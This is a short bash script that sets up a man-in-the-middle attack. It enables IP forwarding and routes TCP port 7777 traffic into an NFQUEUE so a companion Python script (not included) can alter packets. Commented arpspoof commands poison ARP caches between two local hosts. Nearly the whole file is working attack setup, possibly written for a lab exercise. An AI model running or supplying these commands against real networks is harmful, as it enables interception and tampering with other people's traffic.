#! /bin/bash

#Allow packets to pass through the machine and check if the setting has been enabled
echo 1 > /proc/sys/net/ipv4/ip_forward
cat /proc/sys/net/ipv4/ip_forward

#Append this iptable rule to the forward chain and make the packets go to queue 0. The python script will use queue 0's packet to do MiTM.
#I also filtered by destination port 7777. This is not necessary as the script is already doing it but oh well.  

iptables -A FORWARD -p tcp --dport 7777 -j NFQUEUE --queue-num 0

# Please run each of the command below on two seperate terminal. Basically the commands below is to perform arp spoofing. 
# If you have a script that can do the same, you can safely ignore the commands below.

# arpspoof -i eth0 -t 192.168.1.2 192.168.1.3
# arpspoof -i eth0 -t 192.168.1.3 192.168.1.2










